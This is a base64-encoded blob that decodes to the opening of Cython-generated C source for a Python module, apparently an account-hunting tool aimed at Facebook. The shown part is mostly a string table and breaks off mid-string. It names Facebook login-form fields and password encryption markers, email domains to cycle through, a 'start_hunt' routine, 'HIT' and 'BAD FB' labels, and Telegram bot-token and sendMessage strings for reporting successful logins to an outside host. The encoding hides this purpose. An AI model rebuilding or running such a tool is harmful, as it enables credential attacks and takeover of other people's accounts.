ZJWAojZGVmaW5lIF9fUFlYX0FCSV9NT0RVTEVfTkFNRSAiX2N5dGhvbl8iIENZVEhPTl9BQkkKI2RlZmluZSBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggX19QWVhfQUJJX01PRFVMRV9OQU1FICIuIgoKCgoKCiNkZWZpbmUgX19QeXhfTU9EVUxFX05BTUUgImdhIgpleHRlcm4gaW50IF9fcHl4X21vZHVsZV9pc19tYWluX2dhOwppbnQgX19weXhfbW9kdWxlX2lzX21haW5fZ2EgPSAwOwoKCgpzdGF0aWMg""UHlPYmplY3QgKl9fcHl4X2J1aWx0aW5fcHJpbnQ7CnN0YXRpYyBQeU9iamVjdCAqX19weXhfYnVpbHRpbl9pbnB1dDsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9idWlsdGluX3JhbmdlOwoKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19bXSA9ICIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzBbXSA9ICI/MCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMVtdID0gIjEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzJbXSA9ICIyIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19BW10gPSAiX0EiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0JbXSA9ICJfQiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQ1tdID0gIl9DIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19EW10gPSAiRCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfRVtdID0gIkUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0ZbXSA9ICJGIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19HW10gPSAiRyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfSFtdID0gIkgiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0lbXSA9ICJJIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19KW10gPSAiSiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfS1tdID0gIksiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0xbXSA9ICJMIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19NW10gPSAiTSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfTltdID0gIk4iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX09bXSA9ICJPIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19QW10gPSAiUCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfUVtdID0gIlwyMjBRIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19SW10gPSAiUiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfSURbXSA9ICJJRCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzJbXSA9ICJcIlwiIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fM1tdID0gIi4iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX180W10gPSAiPyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY2NbXSA9ICJjYyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZnJbXSA9ICJmciI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2FbXSA9ICJnYSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2NbXSA9ICJnYyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfb3NbXSA9ICJvcyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcnJbXSA9ICJyciI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2JbXSA9ICJzYiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc3NbXSA9ICJzcyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfd2RbXSA9ICJ3ZCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfeHNbXSA9ICJ4cyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tf""MTAwW10gPSAiMTAwIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18xODBbXSA9ICItMTgwIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18xXzJbXSA9ICI/MSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfOTVtW10gPSAiXDAzM1s5NW0iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzk4MFtdID0gIjk4MCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQV8yW10gPSAiQSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQl8yW10gPSAiQiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQ18yW10gPSAiQyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfSElUW10gPSAiIHwgSElUIDogIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19RXzJbXSA9ICJRIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19SRURbXSA9ICJSRUQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2RwcltdID0gImRwciI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZmZmW10gPSAiZmZmIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19sc2RbXSA9ICJsc2QiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2x3dltdID0gImx3diI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcGFzW10gPSAicGFzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19wb3BbXSA9ICJwb3AiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzI4NjdbXSA9ICIyODY3IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19Gb3JlW10gPSAiRm9yZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfSFRNTFtdID0gIkhUTUwiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0xvY2tbXSA9ICJMb2NrIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19NQUlMW10gPSAiIHwgTUFJTCA6ICI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfTm9uZVtdID0gIk5vbmUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2FyZ3NbXSA9ICJhcmdzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19kYXRhW10gPSAiZGF0YSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZGF0cltdID0gImRhdHIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2V4aXRbXSA9ICJfX2V4aXRfXyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZm9udFtdID0gImZvbnQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Z1bmNbXSA9ICJfX2Z1bmNfXyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2FfMltdID0gIl9nYSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfam9pbltdID0gImpvaW4iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2xvY2tbXSA9ICJsb2NrIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19tYWluW10gPSAiX19tYWluX18iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX25hbWVbXSA9ICJfX25hbWVfXyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbmV4dFtdID0gIm5leHQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3Bvc3Rb""XSA9ICJwb3N0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19wc19sW10gPSAicHNfbCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcHNfbltdID0gInBzX24iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NlbmRbXSA9ICJzZW5kIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zcGVjW10gPSAiX19zcGVjX18iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3Rlc3RbXSA9ICJfX3Rlc3RfXyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdGV4dFtdID0gInRleHQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3RpbWVbXSA9ICJ0aW1lIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa190cnVlW10gPSAidHJ1ZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfR1JFRU5bXSA9ICJHUkVFTiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfSElUXzJbXSA9ICJISVQgOiAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0xpbnV4W10gPSAiXCJMaW51eFwiIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19TdHlsZVtdID0gIlN0eWxlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19UT0tFTltdID0gIlRPS0VOIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hbGlnbltdID0gImFsaWduIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19ibGFja1tdID0gImJsYWNrIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19ibG9ja1tdID0gImJsb2NrIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jbGVhcltdID0gImNsZWFyIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jbG9zZVtdID0gImNsb3NlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19lbWFpbFtdID0gImVtYWlsIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19lbl9HQltdID0gImVuX0dCIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19lbnRlcltdID0gIl9fZW50ZXJfXyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZmFsc2VbXSA9ICJmYWxzZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaW5wdXRbXSA9ICJpbnB1dCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbGduanNbXSA9ICJsZ25qcyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbGlnaHRbXSA9ICJsaWdodCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcHJpbnRbXSA9ICJwcmludCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmFuZ2VbXSA9ICJyYW5nZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2xlZXBbXSA9ICJzbGVlcCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc3RhcnRbXSA9ICJzdGFydCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc3RyaXBbXSA9ICJzdHJpcCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdGhyb3dbXSA9ICJ0aHJvdyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdmFsdWVbXSA9ICJ2YWx1ZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfd2hpdGVbXSA9ICJ3aGl0ZSI7CnN0""YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQkFEX0ZCW10gPSAiQkFEIEZCIDogIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19SQURIRVlbXSA9ICJ7UkFESEVZfSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfVGhyZWFkW10gPSAiVGhyZWFkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hY2NlcHRbXSA9ICJhY2NlcHQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2NfdXNlcltdID0gImNfdXNlciI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY2VudGVyW10gPSAiY2VudGVyIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jZm9udHNbXSA9ICJjZm9udHMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Nob2ljZVtdID0gImNob2ljZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY29sb3JzW10gPSAiY29sb3JzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19kYWVtb25bXSA9ICJkYWVtb24iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2RpZ2l0c1tdID0gImRpZ2l0cyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZW5hYmxlW10gPSAiZW5hYmxlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19mYmxfc3RbXSA9ICJmYmxfc3QiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2hpMl9mYltdID0gImhpMl9mYiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaGkyX2luW10gPSAiQGhpMi5pbiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbGduZGltW10gPSAibGduZGltIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19sZ25ybmRbXSA9ICJsZ25ybmQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2xvY2FsZVtdID0gImxvY2FsZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbW9kdWxlW10gPSAiX19tb2R1bGVfXyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfb3JpZ2luW10gPSAib3JpZ2luIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19wYXJhbXNbXSA9ICJwYXJhbXMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JhbmRvbVtdID0gInJhbmRvbSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmVuZGVyW10gPSAicmVuZGVyIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zdHJpbmdbXSA9ICJzdHJpbmciOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3N5c3RlbVtdID0gInN5c3RlbSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdGFyZ2V0W10gPSAidGFyZ2V0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa190cnludW1bXSA9ICJ0cnludW0iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3dsX2NidltdID0gIndsX2NidiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMzYweDgwMFtdID0gIjM2MHg4MDAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0NIQVRfSURbXSA9ICJDSEFUIElEIDogIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19TZXNzaW9uW10gPSAiU2Vzc2lvbiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tf""Y2hhdF9pZFtdID0gImNoYXRfaWQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Nvb2tpZXNbXSA9ICJjb29raWVzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19kaXNhYmxlW10gPSAiZGlzYWJsZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZGlzcGxheVtdID0gImRpc3BsYXkiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2VuY3Bhc3NbXSA9ICJlbmNwYXNzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19nZW5leHByW10gPSAiZ2VuZXhwciI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaGVhZGVyc1tdID0gImhlYWRlcnMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2phem9lc3RbXSA9ICJqYXpvZXN0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19tX2dhX3B5W10gPSAibS9nYS5weSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbWFnZW50YVtdID0gIm1hZ2VudGEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX21lc3NhZ2VbXSA9ICJtZXNzYWdlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19yYW5kaW50W10gPSAicmFuZGludCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmVmZXJlcltdID0gInJlZmVyZXIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3RpbWVvdXRbXSA9ICJ0aW1lb3V0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18xX2hpMl9pbltdID0gIjEuIEBoaTIuaW4iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0JBRF9GQl8yW10gPSAiIHwgQkFEIEZCIDogIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19SQURIRVlfMltdID0gIlJBREhFWSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY29sb3JhbWFbXSA9ICJjb2xvcmFtYSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZG9jdW1lbnRbXSA9ICJkb2N1bWVudCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbmF2aWdhdGVbXSA9ICJuYXZpZ2F0ZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcXVhbG5hbWVbXSA9ICJfX3F1YWxuYW1lX18iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JlcXVlc3RzW10gPSAicmVxdWVzdHMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NldF9uYW1lW10gPSAiX19zZXRfbmFtZV9fIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa190aW1lem9uZVtdID0gInRpbWV6b25lIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19CT1RfVE9LRU5bXSA9ICJCT1QgVE9LRU4gOiAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1JFU0VUX0FMTFtdID0gIlJFU0VUX0FMTCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYXV0aG9yaXR5W10gPSAiYXV0aG9yaXR5IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19iYWRfY291bnRbXSA9ICJiYWRfY291bnQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2hpdF9jb3VudFtdID0gImhpdF9jb3VudCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaXNlbmFibGVkW10gPSAiaXNlbmFibGVk""IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19pc3ByaXZhdGVbXSA9ICJpc3ByaXZhdGUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX21heF9hZ2VfMFtdID0gIm1heC1hZ2U9MCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmRoZG9tYWluW10gPSAicmRoZG9tYWluIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zZWNfY2hfdWFbXSA9ICJzZWMtY2gtdWEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3RocmVhZF9pZFtdID0gInRocmVhZF9pZCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdGhyZWFkaW5nW10gPSAidGhyZWFkaW5nIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18xNzU3MzUyMDg1W10gPSAiMTc1NzM1MjA4NSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYmFja2dyb3VuZFtdID0gImJhY2tncm91bmQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3BhcnNlX21vZGVbXSA9ICJwYXJzZV9tb2RlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zdGFydF9odW50W10gPSAic3RhcnRfaHVudCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdXNlcl9hZ2VudFtdID0gInVzZXItYWdlbnQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzEwMjEyNV8wa2NjW10gPSAiMTAyMTI1XzBrY2MiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0FkRTZQQ2RuM1JZW10gPSAiQWRFNlBDZG4zUlkiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NhbWVfb3JpZ2luW10gPSAic2FtZS1vcmlnaW4iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NlbmRNZXNzYWdlW10gPSAiL3NlbmRNZXNzYWdlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zaWduZWRfbmV4dFtdID0gInNpZ25lZF9uZXh0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hYl90ZXN0X2RhdGFbXSA9ICJhYl90ZXN0X2RhdGEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2NvbnRlbnRfdHlwZVtdID0gImNvbnRlbnQtdHlwZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaW5pdGlhbGl6aW5nW10gPSAiX2luaXRpYWxpemluZyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaXNfY29yb3V0aW5lW10gPSAiX2lzX2Nvcm91dGluZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcHJlZmlsbF90eXBlW10gPSAicHJlZmlsbF90eXBlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19CX2FfSElfMV9RY19jW10gPSAiXDIwMFwwMDFcMzMwXDAwNFwwMDVcMzMwXDAxMFwwMTRcMjEwQlwzMjBcMDE2LlwyNTBhXDMzMFwwMTBcclwyMTBbXDIzMFwwMDRcMjMwSFwyNDBJXDI1MF5cMjcwMVwzMzBcMDEwXDAyMFwyMjBcMDA1XDIyMFFcMjIwY1wyMzBcMDI1XDIzMGNcMjQwXDAzMFwyNTBcMDIxIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19Gb2N1c0xpc3RlbmVyW10gPSAiXCJGb2N1c0xpc3RlbmVyXCIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1BXRF9CUk9XU0VSXzBbXSA9ICIjUFdEX0JST1dT""RVI6MDoiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1JlcXVlc3RfRXJyb3JbXSA9ICIgfCBSZXF1ZXN0IEVycm9yOiAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2NhY2hlX2NvbnRyb2xbXSA9ICJjYWNoZS1jb250cm9sIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jb250YWN0X3BvaW50W10gPSAiY29udGFjdF9wb2ludCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZG9tYWluX2Nob2ljZVtdID0gImRvbWFpbl9jaG9pY2UiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2dhXzAyVkY5RDVGMjZbXSA9ICJfZ2FfMDJWRjlENUYyNiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbG9naW5fYXR0ZW1wdFtdID0gImxvZ2luX2F0dGVtcHQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX21fcGl4ZWxfcmF0aW9bXSA9ICJtX3BpeGVsX3JhdGlvIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zZW5kX3RlbGVncmFtW10gPSAic2VuZF90ZWxlZ3JhbSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdGVsZWdtYWlsX2NvbVtdID0gIkB0ZWxlZ21haWwuY29tIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18zX0JvdGhfZG9tYWluc1tdID0gIjMuIEJvdGggZG9tYWlucyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfNjE1NTU4NjYxNjc1NjdbXSA9ICI2MTU1NTg2NjE2NzU2NyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZW5fR0JfZW5fcV8wXzlbXSA9ICJlbi1HQixlbjtxPTAuOSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcHJlZmlsbF9zb3VyY2VbXSA9ICJwcmVmaWxsX3NvdXJjZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmV0dXJuX3Nlc3Npb25bXSA9ICJyZXR1cm5fc2Vzc2lvbiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2VjX2ZldGNoX2Rlc3RbXSA9ICJzZWMtZmV0Y2gtZGVzdCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2VjX2ZldGNoX21vZGVbXSA9ICJzZWMtZmV0Y2gtbW9kZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2VjX2ZldGNoX3NpdGVbXSA9ICJzZWMtZmV0Y2gtc2l0ZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2VjX2ZldGNoX3VzZXJbXSA9ICJzZWMtZmV0Y2gtdXNlciI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2tpcF9hcGlfbG9naW5bXSA9ICJza2lwX2FwaV9sb2dpbiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdmlld3BvcnRfd2lkdGhbXSA9ICJ2aWV3cG9ydC13aWR0aCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMl90ZWxlZ21haWxfY29tW10gPSAiMi4gQHRlbGVnbWFpbC5jb20iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1NlbGVjdGVkX2hpMl9pbltdID0gIlNlbGVjdGVkOiBAaGkyLmluIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hY2NlcHRfbGFuZ3VhZ2VbXSA9ICJhY2NlcHQtbGFuZ3VhZ2UiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2FzY2lpX2xvd2VyY2FzZVtd""ID0gImFzY2lpX2xvd2VyY2FzZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2VjX2NoX3VhX21vZGVsW10gPSAic2VjLWNoLXVhLW1vZGVsIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zaGFSX3ByZWZzX2RhdGFbXSA9ICJzaGFSX3ByZWZzX2RhdGEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1JlcXVlc3RFeGNlcHRpb25bXSA9ICJSZXF1ZXN0RXhjZXB0aW9uIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19icm93c2VyX2Ryb3Bkb3duW10gPSAiYnJvd3Nlcl9kcm9wZG93biI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaGFkX2NwX3ByZWZpbGxlZFtdID0gImhhZF9jcF9wcmVmaWxsZWQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NlY19jaF91YV9tb2JpbGVbXSA9ICJzZWMtY2gtdWEtbW9iaWxlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa193d3dfZmFjZWJvb2tfY29tW10gPSAid3d3LmZhY2Vib29rLmNvbSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQXZhaWxhYmxlX0RvbWFpbnNbXSA9ICJBdmFpbGFibGUgRG9tYWluczoiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1RocmVhZFBvb2xFeGVjdXRvcltdID0gIlRocmVhZFBvb2xFeGVjdXRvciI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYXN5bmNpb19jb3JvdXRpbmVzW10gPSAiYXN5bmNpby5jb3JvdXRpbmVzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jbGluZV9pbl90cmFjZWJhY2tbXSA9ICJjbGluZV9pbl90cmFjZWJhY2siOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2NvbmN1cnJlbnRfZnV0dXJlc1tdID0gImNvbmN1cnJlbnQuZnV0dXJlcyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZmlyc3RfcHJlZmlsbF90eXBlW10gPSAiZmlyc3RfcHJlZmlsbF90eXBlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zZWNfY2hfdWFfcGxhdGZvcm1bXSA9ICJzZWMtY2gtdWEtcGxhdGZvcm0iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0Nob29zZV9kb21haW5fMV8yXzNbXSA9ICJDaG9vc2UgZG9tYWluICgxLzIvMyk6ICI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZmlyc3RfcHJlZmlsbF9zb3VyY2VbXSA9ICJmaXJzdF9wcmVmaWxsX3NvdXJjZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcH